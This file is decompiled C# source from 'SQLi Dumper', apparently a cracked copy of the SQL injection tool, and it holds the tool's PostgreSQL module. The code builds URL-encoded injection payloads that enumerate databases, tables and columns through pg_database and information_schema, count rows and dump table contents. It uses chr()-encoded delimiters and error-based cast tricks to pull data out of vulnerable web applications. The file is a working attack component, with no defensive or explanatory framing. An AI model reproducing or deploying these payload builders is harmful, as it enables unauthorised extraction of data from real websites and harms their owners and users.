// Decompiled with JetBrains decompiler
// Type: DataBase.PostgreSQL
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;

namespace DataBase
{
  public class PostgreSQL
  {
    private const string BASE_TABLE = "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)";
    private const string CAST_TEXT = "cast(# as text)";
    private const string CAST_ERROR_ = "cast((#) as int)";

    public static string Info(
      string sTraject,
      InjectionType oMethod,
      PostgreSQLErrorType bError,
      List<string> lColumn,
      string sEndUrl = "")
    {
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string newValue1 = sqlChar1 + "||#||" + sqlChar1;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          newValue1 = "(" + newValue1 + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          newValue1 = "cast((#) as int)".Replace("#", newValue1);
          break;
      }
      string newValue2;
      if (lColumn.Count == 1)
      {
        newValue2 = lColumn[0].Trim();
      }
      else
      {
        string str = "";
        int num = checked (lColumn.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (index > 0)
            str = str + "||" + sqlChar2 + "||";
          str += lColumn[index].Trim();
          checked { ++index; }
        }
        newValue2 = str;
      }
      string sData = newValue1.Replace("#", newValue2);
      string newValue3 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue3) + sEndUrl;
    }

    public static string DataBases(
      string sTraject,
      InjectionType oMethod,
      PostgreSQLErrorType bError,
      bool bCorrentDB,
      int iOFFSET,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string newValue1 = sqlChar + "||#||" + sqlChar;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          newValue1 = "(" + newValue1 + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          newValue1 = "cast((#) as int)".Replace("#", newValue1);
          break;
      }
      string sData = !bCorrentDB ? newValue1.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select distinct datname from pg_database where datname not like " + Globals.G_Utilities.ConvertTextToSQLChar("%postgres%", false, "||", "chr") + " and datname not like " + Globals.G_Utilities.ConvertTextToSQLChar("%template%", false, "||", "chr")), Interaction.IIf(!string.IsNullOrEmpty(sWhere), (object) (" and " + sWhere + " "), (object) " ")), Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), (object) ("order by " + sOrderBy + ", [datname] asc "), (object) " ")), (object) "limit 1 offset "), (object) iOFFSET), (object) ")"))) : newValue1.Replace("#", "(select current_database())");
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Tables(
      string sTraject,
      InjectionType oMethod,
      string sDataBase,
      PostgreSQLErrorType bError,
      int iOFFSET,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string newValue1 = sqlChar + "||#||" + sqlChar;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          newValue1 = "(" + newValue1 + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          newValue1 = "cast((#) as int)".Replace("#", newValue1);
          break;
      }
      string sData = newValue1.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select distinct table_name from information_schema.tables where table_catalog=" + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_type like " + "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)" + " and table_name not like " + Globals.G_Utilities.ConvertTextToSQLChar("%pg_%", false, "||", "chr") + " and table_name not like " + Globals.G_Utilities.ConvertTextToSQLChar("%sql_%", false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) " limit 1 offset "), (object) iOFFSET), (object) ")")));
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Columns(
      string sTraject,
      InjectionType oMethod,
      string sDataBase,
      string sTable,
      PostgreSQLErrorType bError,
      int iOFFSET,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string newValue1 = sqlChar + "||#||" + sqlChar;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          newValue1 = "(" + newValue1 + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          newValue1 = "cast((#) as int)".Replace("#", newValue1);
          break;
      }
      string sData = newValue1.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select distinct column_name from information_schema.columns where table_catalog=" + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name=" + Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) " limit 1 offset "), (object) iOFFSET), (object) ")")));
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Dump(
      string sTraject,
      InjectionType oMethod,
      string sDataBase,
      string sTable,
      List<string> lColumn,
      PostgreSQLErrorType bError,
      int iOFFSET,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      string sCustomQuery = "")
    {
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string newValue1 = sqlChar1 + "||#||" + sqlChar1;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          newValue1 = "(" + newValue1 + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          newValue1 = "cast((#) as int)".Replace("#", newValue1);
          break;
      }
      string sData;
      if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
      {
        string str1;
        if (lColumn.Count == 1)
        {
          str1 = "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[0].Trim()));
        }
        else
        {
          string str2 = "";
          int num = checked (lColumn.Count - 1);
          int index = 0;
          while (index <= num)
          {
            if (index > 0)
              str2 = str2 + "||" + sqlChar2 + "||";
            str2 += "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[index].Trim()));
            checked { ++index; }
          }
          str1 = str2;
        }
        sData = newValue1.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str1 + " from " + sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" order by " + sOrderBy))), (object) " limit 1 offset "), (object) iOFFSET), (object) ")")));
      }
      else
      {
        string str = newValue1.Replace("#", sCustomQuery);
        if (str.Contains("[s]"))
          str = str.Replace("[s]", "||" + sqlChar2 + "||");
        sData = str.Replace("[x]", Conversions.ToString(iOFFSET));
      }
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Count(
      string sTraject,
      InjectionType oMethod,
      PostgreSQLErrorType bError,
      Schema o,
      string sDataBase,
      string sTable,
      string sWhere = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string str = sqlChar + "||#||" + sqlChar;
      switch (bError)
      {
        case PostgreSQLErrorType.NONE:
          str = "(" + str + ")";
          break;
        case PostgreSQLErrorType.CAST_INT:
          str = "cast((#) as int)".Replace("#", str);
          break;
      }
      switch (o)
      {
        case Schema.DATABASES:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select count(*) from pg_database where datname not like " + Globals.G_Utilities.ConvertTextToSQLChar("%postgres%", false, "||", "chr") + " and datname not like " + Globals.G_Utilities.ConvertTextToSQLChar("%template%", false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")")));
          break;
        case Schema.TABLES:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select count(*) from information_schema.tables where table_catalog=" + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_type like " + "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)" + " and table_name not like " + Globals.G_Utilities.ConvertTextToSQLChar("%pg_%", false, "||", "chr") + " and table_name not like " + Globals.G_Utilities.ConvertTextToSQLChar("%sql_%", false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")")));
          break;
        case Schema.COLUMNS:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select count(*) from information_schema.columns where table_catalog=" + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name=" + Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")")));
          break;
        case Schema.ROWS:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select count(*) from " + sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")")));
          break;
      }
      string newValue = Globals.G_Utilities.EncodeURL(str);
      return sTraject.Replace("[t]", newValue) + sEndUrl;
    }
  }
}
